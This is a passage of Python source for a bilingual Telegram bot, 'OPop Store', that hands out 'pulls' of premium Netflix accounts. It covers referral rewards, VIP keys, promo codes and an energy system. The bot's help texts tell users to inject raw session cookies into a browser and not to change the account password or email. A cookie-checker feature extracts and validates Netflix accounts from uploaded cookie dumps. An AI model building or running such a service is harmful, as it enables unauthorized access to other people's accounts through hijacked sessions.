    bot.reply_to(message, msg_en if lang=="en" else msg_ar, parse_mode="HTML")

def process_admin_reply(message, target_id):
    bot.send_message(target_id, f"📢 <b>رسالة من الإدارة / Support Reply:</b>\n━━━━━━━━━━━━━━━━━━\n{message.text}\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>", parse_mode="HTML")
    bot.reply_to(message, "✅ <b>تم إرسال الرد بنجاح!</b>", parse_mode="HTML")

# ==========================================
# 🚀 SMART REFERRAL LOGIC
# ==========================================
def check_and_reward_referral(uid):
    with DB_LOCK:
        users = load_db(USERS_FILE, {})
        u = users.get(str(uid), {})
        ref_id = u.get("referred_by")
        if ref_id and not u.get("ref_rewarded") and ref_id in users:
            users[str(uid)]["ref_rewarded"] = True
            users[str(uid)]["points"] += 0.5 
            users[ref_id]["refs"] += 1
            
            cap = TIERS.get(users[ref_id].get("tier", "Free"), TIERS["Free"])["cap"]
            space = cap - users[ref_id].get("energy", 0.0)
            if space > 0:
                fill = min(space, 50.0)
                users[ref_id]["energy"] += fill
                users[ref_id]["reserve"] += (50.0 - fill)
            else: users[ref_id]["reserve"] += 50.0 
            
            ref_lang = users[ref_id].get("lang", "en")
            new_lang = users[str(uid)].get("lang", "en")
            
            msg_welcome_en = "🎉 <b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗚𝗜𝗙𝗧!</b>\n━━━━━━━━━━━━━━━━━━\nYou joined via a friend's link and received <b>0.5 Bonus Points</b>! 🎁\n\n<blockquote>💡 <i>Reach 1.0 Pts to get a FREE Pull without using energy!</i></blockquote>"
            msg_welcome_ar = "🎉 <b>هدية الترحيب!</b>\n━━━━━━━━━━━━━━━━━━\nلقد دخلت عبر رابط صديق، وحصلت على <b>0.5 نقاط مكافأة</b> كهدية! 🎁\n\n<blockquote>💡 <i>تلميح: اجمع 1.0 نقطة لتحصل على سحبة مجانية بدون استهلاك الطاقة!</i></blockquote>"
            try: bot.send_message(int(uid), msg_welcome_en if new_lang == "en" else msg_welcome_ar, parse_mode="HTML")
            except: pass
            
            bar = get_progress_bar(users[ref_id]['refs'], 15, style="blocks")
            if users[ref_id]["refs"] >= 15 and users[ref_id]["tier"] == "Free":
                users[ref_id]["tier"] = "PRO"
                users[ref_id]["energy"] = 200.0
                msg_upg = "🎉 <b>𝗚𝗥𝗜𝗡𝗗𝗘𝗥 𝗥𝗘𝗪𝗔𝗥𝗗!</b>\n━━━━━━━━━━━━━━━━━━\nYou reached 15 invites! Your account is upgraded to <b>PRO</b> permanently! 👑" if ref_lang=="en" else "🎉 <b>مكافأة الإنجاز!</b>\n━━━━━━━━━━━━━━━━━━\nلقد جمعت 15 إحالة! تم ترقية حسابك إلى رتبة <b>PRO</b> مدى الحياة! 👑"
                try: bot.send_message(int(ref_id), msg_upg, parse_mode="HTML")
                except: pass
            
            msg_en = (f"⭐ <b>𝗡𝗘𝗪 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗖𝗔𝗣𝗧𝗨𝗥𝗘𝗗</b>\n━━━━━━━━━━━━━━━━━━\n👨‍💻 <b>Target:</b> New User Joined\n🔋 <b>Reward:</b> +50⚡ added\n📊 <b>Progress:</b> [{bar}] {users[ref_id]['refs']}/15\n\n<blockquote>💡 <i>Tip: Hit 15 invites to auto-unlock PRO Rank!</i></blockquote>")
            msg_ar = (f"⭐ <b>إحالة ناجحة!</b>\n━━━━━━━━━━━━━━━━━━\n👨‍💻 <b>الهدف:</b> انضمام مستخدم جديد\n🔋 <b>المكافأة:</b> تمت إضافة +50⚡\n📊 <b>التقدم:</b> [{bar}] {users[ref_id]['refs']}/15\n\n<blockquote>💡 <i>تلميح: اجمع 15 إحالة لفتح رتبة PRO تلقائياً!</i></blockquote>")
            try: bot.send_message(int(ref_id), msg_en if ref_lang == "en" else msg_ar, parse_mode="HTML")
            except: pass
            save_db(USERS_FILE, users)

# ==========================================
# 🚀 USER COMMANDS & CALLBACKS
# ==========================================
@bot.message_handler(commands=['start', 'ping'])
def start_handler(message):
    uid = str(message.chat.id)
    
    # Get lang early for messages
    temp_users = load_db(USERS_FILE, {})
    lang = temp_users.get(uid, {}).get("lang", "en")
    
    if is_banned(uid): 
        msg_ban = "🔴 <b>You have been banned from the bot.</b>" if lang == "en" else "🔴 <b>تم حظرك من البوت.</b>"
        return bot.send_message(message.chat.id, msg_ban, parse_mode="HTML")
        
    if is_maintenance() and int(uid) != ADMIN_ID: 
        msg_maint = "⚙️ <b>The bot is currently under maintenance. Please try again later.</b> 🛑" if lang == "en" else "⚙️ <b>البوت حالياً في فترة صيانة. يرجى المحاولة لاحقاً.</b> 🛑"
        return bot.send_message(message.chat.id, msg_maint, parse_mode="HTML")

    if message.text.startswith('/ping'):
        uptime_sec = int(time.time() - BOT_START_TIME)
        uptime_str = str(timedelta(seconds=uptime_sec))
        proxy_status = "🔴 Disabled (Direct IP Mode)"
        bot.reply_to(message, f"📡 <b>OPOP V-GOD PING</b>\n━━━━━━━━━━━━━━━━━━\n⏳ <b>Uptime:</b> {uptime_str}\n🛡️ <b>Proxy Shield:</b> {proxy_status}\n👥 <b>Users DB:</b> {len(load_db(USERS_FILE, {}))}\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>", parse_mode="HTML")
        return

    bot.clear_step_handler_by_chat_id(message.chat.id)
    db_u = load_db(USERS_FILE, {})
    is_new = uid not in db_u
    users = init_user(uid, message.from_user.first_name, message.from_user.username)
    
    args = message.text.split()
    if is_new and len(args) > 1 and args[1] != uid and args[1] in users:
        with DB_LOCK: users_upd = load_db(USERS_FILE, {}); users_upd[uid]["referred_by"] = args[1]; save_db(USERS_FILE, users_upd); users = users_upd

    if not users[uid].get("lang"):
        welcome_txt = (
            "╔══════════════════════════════════════╗\n"
            "       ✨ <b>WELCOME TO OPOP STORE</b> ✨       \n"
            "╚══════════════════════════════════════╝\n\n"
            "👋 <b>Welcome to the Ultimate Auto-Drip System!</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🌐 <b>Please choose your language to start:</b>\n"
            "🌐 <b>المرجو اختيار لغتك للبدء:</b>"
        )
        return bot.send_message(message.chat.id, welcome_txt, reply_markup=language_markup(), parse_mode="HTML")

    if not check_subscription(message.chat.id):
        lang = users[uid].get("lang", "en")
        m = InlineKeyboardMarkup().add(InlineKeyboardButton("✅ Verify Subscription" if lang=="en" else "✅ تأكيد الاشتراك", callback_data="check_sub"))
        msg_en = f"⚠️ <b>Access Denied!</b>\n━━━━━━━━━━━━━━━━━━\nYou must join our channel first.\n📌 <a href='{CHANNEL_LINK}'>Join Here</a>"
        msg_ar = f"⚠️ <b>الوصول مرفوض!</b>\n━━━━━━━━━━━━━━━━━━\nيجب عليك الاشتراك في قناتنا الرسمية أولاً.\n📌 <a href='{CHANNEL_LINK}'>اضغط هنا للاشتراك</a>"
        return bot.send_message(message.chat.id, msg_en if lang=="en" else msg_ar, reply_markup=m, disable_web_page_preview=True, parse_mode="HTML")

    check_and_reward_referral(uid)
    bot.send_message(message.chat.id, dashboard_text(uid, message.from_user.first_name), reply_markup=main_menu(uid, users[uid]["lang"]), disable_web_page_preview=True, parse_mode="HTML")

@bot.message_handler(commands=['redeem', 'promo'])
def apply_code(message):
    bot.clear_step_handler_by_chat_id(message.chat.id)
    uid = str(message.chat.id)
    if is_banned(uid): return

    now = time.time()
    if now - ANTI_SPAM.get(uid, 0) < 0.5: return
    ANTI_SPAM[uid] = now

    cmd, args = message.text.split()[0], message.text.split()
    if len(args) < 2: return bot.reply_to(message, "<blockquote>⚠️ Usage: `/redeem CODE` or `/promo CODE`</blockquote>", parse_mode="HTML")

    code, users = args[1].upper(), init_user(uid, message.from_user.first_name, message.from_user.username)
    db_file = KEYS_FILE if cmd == '/redeem' else PROMO_FILE
    lang = users[uid].get("lang", "en")

    msg_wait = bot.reply_to(message, "⏳ <i>[■■■□□□] Validating Code...</i>" if lang=="en" else "⏳ <i>[■■■□□□] جاري التحقق من الرمز...</i>", parse_mode="HTML")
    time.sleep(0.4)

    with DB_LOCK:
        db = load_db(db_file, {})
        if cmd == '/redeem':
            if code in db and not db[code]["used"]:
                users[uid]["tier"] = db[code]["tier"]
                users[uid]["energy"] = TIERS.get(db[code]["tier"], TIERS["Free"])["cap"]
                db[code]["used"] = True
                save_db(db_file, db); save_db(USERS_FILE, users)
                msg_ok_en = f"✅ <b>𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗</b> ✅\n━━━━━━━━━━━━━━━━━━\n👑 <b>Tier Upgraded to:</b> <b>{users[uid]['tier']}</b>\n⚡ Energy fully restored!\n\n<blockquote>💡 <i>Tip: Go to Main Menu to pull premium accounts instantly.</i></blockquote>"
                msg_ok_ar = f"✅ <b>تم التفعيل بنجاح</b> ✅\n━━━━━━━━━━━━━━━━━━\n👑 <b>تمت ترقية الرتبة إلى:</b> <b>{users[uid]['tier']}</b>\n⚡ تم شحن طاقتك بالكامل!\n\n<blockquote>💡 <i>تلميح: اذهب للقائمة الرئيسية لتبدأ السحب.</i></blockquote>"
                bot.edit_message_text(msg_ok_en if lang == "en" else msg_ok_ar, chat_id=message.chat.id, message_id=msg_wait.message_id, parse_mode="HTML")
            else: bot.edit_message_text("❌ <b>Invalid or used key.</b>" if lang == "en" else "❌ <b>المفتاح غير صحيح أو تم استخدامه مسبقاً.</b>", chat_id=message.chat.id, message_id=msg_wait.message_id, parse_mode="HTML")
        else:
            if code in db and uid not in db[code]["used_by"] and len(db[code]["used_by"]) < db[code]["max"]:
                typ, val = db[code]["type"], db[code]["val"]
                if typ == "ENERGY": 
                    cap = TIERS.get(users[uid].get("tier", "Free"), TIERS["Free"])["cap"]
                    space = cap - users[uid].get("energy", 0.0)
                    if space > 0:
                        fill = min(space, val)
                        users[uid]["energy"] += fill
                        users[uid]["reserve"] += (val - fill)
                    else: users[uid]["reserve"] += val
                    txt = f"+{val}⚡ added" if lang=="en" else f"+{val}⚡ تمت إضافتها"
                elif typ == "BONUS": users[uid]["points"] += val; txt = f"+{val} Bonus Pts" if lang=="en" else f"+{val} نقاط مكافأة"
                db[code]["used_by"].append(uid)
                save_db(db_file, db); save_db(USERS_FILE, users)
                bot.edit_message_text(f"🧧 <b>PROMO APPLIED!</b>\n━━━━━━━━━━━━━━━━━━\n{txt}" if lang=="en" else f"🧧 <b>تم قبول الرمز بنجاح!</b>\n━━━━━━━━━━━━━━━━━━\n{txt}", chat_id=message.chat.id, message_id=msg_wait.message_id, parse_mode="HTML")
            else: bot.edit_message_text("❌ <b>Expired or used promo.</b>" if lang == "en" else "❌ <b>الرمز الترويجي منتهي أو تم استخدامه مسبقاً.</b>", chat_id=message.chat.id, message_id=msg_wait.message_id, parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: True)
def callbacks(c):
    uid = str(c.message.chat.id)
    
    # Get lang early for messages
    temp_users = load_db(USERS_FILE, {})
    lang = temp_users.get(uid, {}).get("lang", "en")

    if is_banned(uid): 
        msg_ban = "🔴 <b>You have been banned from the bot.</b>" if lang == "en" else "🔴 <b>تم حظرك من البوت.</b>"
        return bot.send_message(c.message.chat.id, msg_ban, parse_mode="HTML")
        
    if is_maintenance() and int(uid) != ADMIN_ID: 
        msg_maint = "⚙️ <b>The bot is currently under maintenance. Please try again later.</b> 🛑" if lang == "en" else "⚙️ <b>البوت حالياً في فترة صيانة. يرجى المحاولة لاحقاً.</b> 🛑"
        return bot.send_message(c.message.chat.id, msg_maint, parse_mode="HTML")

    now = time.time()
    if now - ANTI_SPAM.get(uid, 0) < 0.5: return 
    ANTI_SPAM[uid] = now

    users = init_user(uid, c.from_user.first_name, c.from_user.username)
    lang = users[uid].get("lang", "en")

    if c.data == "ignore": return

    if c.data not in ["check_sub", "lang_en", "lang_ar"]:
        if not check_subscription(c.message.chat.id):
            m = InlineKeyboardMarkup()
            m.add(InlineKeyboardButton("📢 Official Channel" if lang=="en" else "📢 القناة الرسمية", url=CHANNEL_LINK))
            m.add(InlineKeyboardButton("✅ Verify Subscription" if lang=="en" else "✅ تأكيد الاشتراك", callback_data="check_sub"))
            msg_en = f"⚠️ <b>Access Denied!</b>\n━━━━━━━━━━━━━━━━━━\nYou left the channel! You must join back to use the bot."
            msg_ar = f"⚠️ <b>الوصول مرفوض!</b>\n━━━━━━━━━━━━━━━━━━\nلقد غادرت القناة! يجب عليك العودة والاشتراك في قناتنا للاستمرار في السحب."
            bot.edit_message_text(msg_en if lang=="en" else msg_ar, c.message.chat.id, c.message.message_id, reply_markup=m, disable_web_page_preview=True, parse_mode="HTML")
            return

    if c.data.startswith("lang_"):
        l = "en" if "en" in c.data else "ar"
        with DB_LOCK: users[uid]["lang"] = l; save_db(USERS_FILE, users)
        
        if not check_subscription(c.message.chat.id):
            m = InlineKeyboardMarkup().add(InlineKeyboardButton("✅ Verify Subscription" if l=="en" else "✅ تأكيد الاشتراك", callback_data="check_sub"))
            msg_en = f"⚠️ <b>Access Denied!</b>\n━━━━━━━━━━━━━━━━━━\nYou must join our channel first.\n📌 <a href='{CHANNEL_LINK}'>Join Here</a>"
            msg_ar = f"⚠️ <b>الوصول مرفوض!</b>\n━━━━━━━━━━━━━━━━━━\nيجب عليك الاشتراك في قناتنا الرسمية أولاً.\n📌 <a href='{CHANNEL_LINK}'>اضغط هنا للاشتراك</a>"
            return bot.edit_message_text(msg_en if l=="en" else msg_ar, c.message.chat.id, c.message.message_id, reply_markup=m, disable_web_page_preview=True, parse_mode="HTML")
            
        check_and_reward_referral(uid)
        bot.edit_message_text(dashboard_text(uid, c.from_user.first_name), c.message.chat.id, c.message.message_id, reply_markup=main_menu(uid, l), disable_web_page_preview=True, parse_mode="HTML")
        
    elif c.data == "ch_lang":
        lang_txt = (
            "╔══════════════════════════════════════╗\n"
            "       👑 <b>OPOP SYSTEM SETTINGS</b> 👑       \n"
            "╚══════════════════════════════════════╝\n\n"
            "🌐 <b>Choose your language / اختر لغتك:</b>"
        )
        bot.edit_message_text(lang_txt, c.message.chat.id, c.message.message_id, reply_markup=language_markup(), parse_mode="HTML")
    
    elif c.data == "bot_ping":
        uptime_sec = int(time.time() - BOT_START_TIME)
        uptime_str = str(timedelta(seconds=uptime_sec))
        proxy_status = "🔴 Disabled (Direct IP Mode)"
        txt = (f"📡 <b>OPOP V-GOD PING</b>\n━━━━━━━━━━━━━━━━━━\n⏳ <b>Uptime:</b> {uptime_str}\n🛡️ <b>Proxy Shield:</b> {proxy_status}\n👥 <b>Users DB:</b> {len(load_db(USERS_FILE, {}))}\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>")
        bot.edit_message_text(txt, c.message.chat.id, c.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Back" if lang=="en" else "🏠 الرجوع", callback_data="more_menu")), parse_mode="HTML")

    elif c.data.startswith("reply_ticket_"):
        target_id = c.data.split("_")[2]
        msg = bot.send_message(c.message.chat.id, "✍️ <b>Type your reply message now:</b>\n<i>(It will be sent directly to the user)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, process_admin_reply, target_id)

    elif c.data == "my_info":
        effect_msgs = ["⏳ <i>[■■□□□□] Loading Profile...</i>", "⏳ <i>[■■■■□□] Verifying Data...</i>", "⏳ <i>[■■■■■■] Processing...</i>"]
        for eff in effect_msgs:
            try: bot.edit_message_text(eff, c.message.chat.id, c.message.message_id, parse_mode="HTML"); time.sleep(0.2)
            except Exception: pass
            
        u = users.get(uid, {})
        if lang == "en":
            txt = (f"📇 <b>𝗠𝗬 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢</b>\n━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>{uid}</code>\n👑 <b>Tier:</b> <b>{u.get('tier')}</b>\n⚡ <b>Energy:</b> {int(u.get('energy', 0))}/{TIERS.get(u.get('tier', 'Free'))['cap']}⚡\n📦 <b>Reserve Tank:</b> +{int(u.get('reserve', 0))}⚡\n📈 <b>Lifetime Pulls:</b> {u.get('total_pulls', 0)} Accounts\n👥 <b>Total Invites:</b> {u.get('refs')} Friends\n🎟️ <b>Wallet Points:</b> {u.get('points')} Pts\n━━━━━━━━━━━━━━━━━━\n<blockquote>💡 <i>Tip: Keep inviting friends to unlock PRO Rank permanently!</i></blockquote>")
            m_back = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Back", callback_data="more_menu"))
        else:
            txt = (f"📇 <b>معلومات حسابي الشاملة</b>\n━━━━━━━━━━━━━━━━━━\n🆔 <b>المعرف:</b> <code>{uid}</code>\n👑 <b>الرتبة:</b> <b>{u.get('tier')}</b>\n⚡ <b>الطاقة:</b> {int(u.get('energy', 0))}/{TIERS.get(u.get('tier', 'Free'))['cap']}⚡\n📦 <b>الخزان الاحتياطي:</b> +{int(u.get('reserve', 0))}⚡\n📈 <b>إجمالي السحبات:</b> {u.get('total_pulls', 0)} حسابات\n👥 <b>عدد الدعوات:</b> {u.get('refs')} أصدقاء\n🎟️ <b>نقاط المحفظة:</b> {u.get('points')} نقاط\n━━━━━━━━━━━━━━━━━━\n<blockquote>💡 <i>تلميح: استمر في دعوة الأصدقاء للحصول على رتبة PRO دائماً!</i></blockquote>")
            m_back = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 الرجوع", callback_data="more_menu"))
        bot.edit_message_text(txt, c.message.chat.id, c.message.message_id, reply_markup=m_back, parse_mode="HTML")

    elif c.data == "mini_guide":
        m_guide = InlineKeyboardMarkup()
        if lang == "en":
            txt = ("📖 <b>𝗦𝗬𝗦𝗧𝗘𝗠 𝗗𝗢𝗖𝗦: 𝗛𝗢𝗪 𝗧𝗢 𝗨𝗦𝗘</b>\n━━━━━━━━━━━━━━━━━━\n\n⚡ <b>1. 𝗛𝗢𝗪 𝗧𝗢 𝗟𝗢𝗚𝗜𝗡 (𝗖𝗢𝗢𝗞𝗜𝗘𝗦)</b>\n▸ <b>Important:</b> Always try RAW COOKIES directly for 100% success.\n▸ <b>Step 1:</b> Copy the RAW COOKIE format.\n▸ <b>Step 2:</b> Inject into your browser using extensions.\n\n🌩️ <b>2. 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗖𝗛𝗘𝗖𝗞𝗘𝗥</b>\n▸ <b>Step 1:</b> Launch 'Advanced Cookies Checker' from the menu.\n▸ <b>Step 2:</b> Upload your <code>.txt</code> or <code>.zip</code> file directly.\n▸ <i>Result:</i> Engine auto-scans & outputs a clean Pro format file.\n\n⚠️ <b>𝗜𝗠𝗣𝗢𝗥𝗧𝗔𝗡𝗧 𝗡𝗢𝗧𝗘:</b>\n▸ Do not change account details (Password/Email).\n▸ Extracted accounts self-destruct after 15 mins.\n\n<blockquote>💡 <i>Tip: The system automatically purges dead cookies.</i></blockquote>\n\n✅ <b>VIDEO TUTORIALS:</b>\nWatch our step-by-step guides below 👇")
            m_guide.row(InlineKeyboardButton("📱 Phone Tutorial", url="https://t.me/HOPhoxmpd/91"), InlineKeyboardButton("💻 PC Tutorial", url="https://t.me/HOPhoxmpd/93"))
            m_guide.add(InlineKeyboardButton("🏠 Back", callback_data="main_menu"))
        else:
            txt = ("📖 <b>وثائق النظام: طريقة الاستعمال</b>\n━━━━━━━━━━━━━━━━━━\n\n⚡ <b>1. طريقة تسجيل الدخول (الكوكيز):</b>\n▸ <b>مهم جداً:</b> استخدم الكوكيز بصيغة RAW COOKIES لضمان النجاح 100%.\n▸ <b>الخطوة 1:</b> قم بنسخ الكوكيز بصيغة RAW.\n▸ <b>الخطوة 2:</b> قم بحقنه في المتصفح عبر إضافات الكوكيز المخصصة.\n\n🌩️ <b>2. فاحص الكوكيز المتقدم (Checker):</b>\n▸ <b>الخطوة 1:</b> اختر 'فاحص الكوكيز المتقدم' من القائمة.\n▸ <b>الخطوة 2:</b> قم برفع ملف <code>.txt</code> أو <code>.zip</code> الخاص بك مباشرة.\n▸ <i>النتيجة:</i> سيقوم المحرك بفحص الحسابات واستخراجها في ملف احترافي.\n\n⚠️ <b>ملاحظات أمنية هامة:</b>\n▸ يُمنع تغيير تفاصيل الحساب (كلمة المرور/البريد الإلكتروني).\n▸ يتم حذف بيانات الحساب المستخرجة تلقائياً بعد 15 دقيقة لحماية الحساب.\n\n<blockquote>💡 <i>تلميح: يقوم النظام بحذف الكوكيز المعطلة تلقائياً.</i></blockquote>\n\n✅ <b>شروحات الفيديو (Tutorials):</b>\nشاهد الشروحات المرئية خطوة بخطوة بالأسفل 👇")
            m_guide.row(InlineKeyboardButton("📱 شرح الهاتف", url="https://t.me/HOPhoxmpd/91"), InlineKeyboardButton("💻 شرح الحاسوب", url="https://t.me/HOPhoxmpd/93"))
            m_guide.add(InlineKeyboardButton("🏠 الرجوع", callback_data="main_menu"))
        
        bot.edit_message_text(txt, c.message.chat.id, c.message.message_id, reply_markup=m_guide, parse_mode="HTML")

    elif c.data == "guide_menu":
        if lang == "en":
            txt = ("📖 <b>𝗦𝗬𝗦𝗧𝗘𝗠 𝗗𝗢𝗖𝗦: 𝗙𝗨𝗟𝗟 𝗨𝗦𝗘𝗥 𝗚𝗨𝗜𝗗𝗘</b>\n━━━━━━━━━━━━━━━━━━\n\n📦 <b>1. 𝗦𝗧𝗢𝗖𝗞 & 𝗣𝗨𝗟𝗟𝗦</b>\n+ <b>Limit:</b> Every user uses Energy for pulls.\n+ <b>Cooldown:</b> Energy completely auto-drips every few hours based on tier.\n\n💎 <b>2. 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗦𝗬𝗦𝗧𝗘𝗠</b>\n+ <b>Action:</b> Share your link from the menu.\n+ <b>Reward:</b> Friend gets Bonus, you get +50⚡ Reserve.\n+ <b>Goal:</b> 15 Friends = PRO Rank forever!\n\n🔑 <b>3. 𝗩𝗜𝗣 𝗞𝗘𝗬𝗦 & 𝗣𝗥𝗢𝗠𝗢𝗦</b>\n+ <b>VIP Keys:</b> Buy from Admin to upgrade rank & massive limits.\n+ <b>Promos:</b> Event codes for free extra limits.\n\n🔎 <b>4. 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗖𝗛𝗘𝗖𝗞𝗘𝗥</b>\n+ <b>Usage:</b> Upload your <code>.txt</code> or <code>.zip</code> file directly.\n+ <b>Engine:</b> Auto-extracts & checks Netflix cookies in Pro format.\n\n⚡ <b>5. 𝗔𝗨𝗧𝗢-𝗟𝗢𝗚𝗜𝗡 𝗦𝗬𝗦𝗧𝗘𝗠</b>\n+ <b>Login:</b> Click link -> Open in App (Use Brave Browser).\n\n⚠️ <b>𝗜𝗠𝗣𝗢𝗥𝗧𝗔𝗡𝗧 𝗡𝗢𝗧𝗘:</b> Accounts self-destruct in 15 mins.\n\n<blockquote>💡 <i>Tip: The bot automatically refunds dead accounts if reported!</i></blockquote>")
        else:
            txt = ("📖 <b>وثائق النظام: الدليل الشامل</b>\n━━━━━━━━━━━━━━━━━━\n\n📦 <b>1. المخزون والسحبات</b>\n+ <b>نظام الطاقة:</b> كل عملية سحب تستهلك مقداراً من الطاقة.\n+ <b>تجديد الطاقة:</b> تتجدد الطاقة تلقائياً كل بضع ساعات بناءً على رتبتك الحالية.\n\n💎 <b>2. نظام الإحالات</b>\n+ <b>الإجراء:</b> قم بمشاركة رابط الدعوة الخاص بك.\n+ <b>المكافأة:</b> تحصل على +50⚡ في الخزان الاحتياطي لكل مستخدم جديد، ويحصل هو على نقاط مكافأة.\n+ <b>الهدف:</b> 15 إحالة تمنحك ترقية دائمة لرتبة PRO!\n\n🔑 <b>3. مفاتيح VIP والرموز الترويجية</b>\n+ <b>مفاتيح VIP:</b> يتم شراؤها من الإدارة لترقية الرتبة والحصول على حدود سحب ضخمة.\n+ <b>الرموز (Promo):</b> أكواد مجانية تمنحك طاقة أو نقاط إضافية.\n\n🔎 <b>4. فاحص الكوكيز المتقدم</b>\n+ <b>الاستخدام:</b> قم برفع ملف <code>.txt</code> أو <code>.zip</code> مباشرة في البوت للفحص التلقائي.\n\n⚡ <b>5. الدخول التلقائي (Auto-Login)</b>\n+ <b>تسجيل الدخول:</b> انقر على الرابط، ثم اختر الفتح عبر التطبيق (نوصي بمتصفح Brave).\n\n⚠️ <b>ملاحظة هامة جداً:</b> يُمنع تغيير تفاصيل الحساب، ويتم إتلاف رسالة الحساب بعد 15 دقيقة لدواعٍ أمنية.\n\n<blockquote>💡 <i>تلميح: يقوم البوت بتعويض الطاقة تلقائياً عند الإبلاغ عن الحسابات المعطلة!</i></blockquote>")
        bot.edit_message_text(txt, c.message.chat.id, c.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Back", callback_data="more_menu")), parse_mode="HTML")

    elif c.data == "check_sub":
        if check_subscription(c.message.chat.id):
            check_and_reward_referral(uid)
            try: bot.answer_callback_query(c.id, "✅ تم التحقق من الاشتراك بنجاح!" if lang=="ar" else "✅ Subscription Verified successfully!", show_alert=True)
            except: pass
            bot.edit_message_text(dashboard_text(uid, c.from_user.first_name), c.message.chat.id, c.message.message_id, reply_markup=main_menu(uid, lang), disable_web_page_preview=True, parse_mode="HTML")
        else: 
            try: bot.answer_callback_query(c.id, "❌ Join Channel First! / يرجى الاشتراك في القناة أولاً!", show_alert=True)
            except: pass
            
    elif c.data == "open_checker":
        effect_msgs = ["⏳ <i>[■■□□□□] Loading Checker...</i>", "⏳ <i>[■■■■□□] Verifying Database...</i>", "⏳ <i>[■■■■■■] Done...</i>"]
        for eff in effect_msgs:
            try: bot.edit_message_text(eff, c.message.chat.id, c.message.message_id, parse_mode="HTML"); time.sleep(0.2)
            except Exception: pass
            
        txt_en = "🌩️ <b>OPOP Advanced Cookies Checker</b> 🔎\n━━━━━━━━━━━━━━━━━━\n<i>Send me your cookie file (.txt or .zip) to extract and check Netflix accounts instantly.</i>\n\n<blockquote>💡 Tip: Just upload the file directly here, no commands needed!</blockquote>"
        txt_ar = "🌩️ <b>نظام OPOP لفحص الكوكيز</b> 🔎\n━━━━━━━━━━━━━━━━━━\n<i>أرسل ملف الكوكيز الخاص بك (.txt أو .zip) للفحص واستخراج حسابات نتفليكس فوراً.</i>\n\n<blockquote>💡 تلميح: قم برفع الملف مباشرة هنا، بدون الحاجة لأي أوامر إضافية.</blockquote>"
        msg = bot.edit_message_text(txt_en if lang == "en" else txt_ar, c.message.chat.id, c.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Cancel" if lang=="en" else "🏠 إلغاء", callback_data="main_menu")), parse_mode="HTML")
        bot.register_next_step_handler(msg, process_checker_file_start, lang)
        
    elif c.data == "main_menu":
        bot.clear_step_handler_by_chat_id(c.message.chat.id)
        bot.edit_message_text(dashboard_text(uid, c.from_user.first_name), c.message.chat.id, c.message.message_id, reply_markup=main_menu(uid, lang), disable_web_page_preview=True, parse_mode="HTML")
    
    elif c.data == "support_info":
        txt_en = "✉️ <b>Support Center | OPop Store</b>\n━━━━━━━━━━━━━━━━━━\n<blockquote>Have an issue or need VIP? Open a ticket to contact the admin directly through the bot.</blockquote>"
        txt_ar = "✉️ <b>مركز الدعم الفني | OPop Store</b>\n━━━━━━━━━━━━━━━━━━\n<blockquote>هل تواجه مشكلة أو ترغب في ترقية رتبتك إلى VIP؟ افتح تذكرة للتواصل مع الإدارة مباشرة عبر البوت.</blockquote>"
        m = InlineKeyboardMarkup()
        m.row(InlineKeyboardButton("📄 Open Ticket (Bot)", callback_data="open_ticket"))
        m.row(InlineKeyboardButton("📸 Instagram Support", url=SUPPORT_INSTA))
        m.row(InlineKeyboardButton("💬 Direct Message", url=f"https://t.me/{OWNER_USERNAME}"))
        m.add(InlineKeyboardButton("🏠 Back" if lang=="en" else "🏠 الرجوع", callback_data="main_menu"))
        bot.edit_message_text(txt_en if lang=="en" else txt_ar, c.message.chat.id, c.message.message_id, reply_markup=m, parse_mode="HTML")

    elif c.data == "more_menu":
        bot.edit_message_text("➕ <b><i>More Services:</i></b>\n━━━━━━━━━━━━━━━━━━" if lang == "en" else "➕ <b><i>المزيد من الخدمات:</i></b>\n━━━━━━━━━━━━━━━━━━", c.message.chat.id, c.message.message_id, reply_markup=more_services_menu(uid, lang), parse_mode="HTML")

    elif c.data == "open_ticket":
        msg = bot.edit_message_text("✍️ <b>Type your message below:</b>\n<i>(Admin will reply here)</i>" if lang=="en" else "✍️ <b>اكتب رسالتك للإدارة الآن:</b>\n<i>(سيتم الرد عليك في أقرب وقت)</i>", c.message.chat.id, c.message.message_id, parse_mode="HTML")
        bot.register_next_step_handler(msg, process_support_ticket, lang)

    elif c.data == "gift_info":
        if lang == "en":
            txt = "🎁 <b>ENERGY GIFTING SYSTEM</b>\n━━━━━━━━━━━━━━━━━━\nYou can share your Energy with other users!\n\n✍️ <b>To send a gift:</b>\n<code>/gift [User_ID] [Amount]</code>\n\n<i>Example:</i>\n<code>/gift 123456789 50</code>"
        else:
            txt = "🎁 <b>نظام إهداء الطاقة</b>\n━━━━━━━━━━━━━━━━━━\nيمكنك الآن مشاركة طاقتك وإرسالها كهدية لأصدقائك!\n\n✍️ <b>طريقة الإرسال:</b>\n<code>/gift [User_ID] [Amount]</code>\n\n<i>مثال:</i>\n<code>/gift 123456789 50</code>"
        bot.edit_message_text(txt, c.message.chat.id, c.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Back" if lang=="en" else "🏠 الرجوع", callback_data="more_menu")), parse_mode="HTML")

    elif c.data == "report_bad_account":
        raw_cookie, srv = users[uid].get("last_pull_nf"), users[uid].get("last_pull_srv", "Netflix")
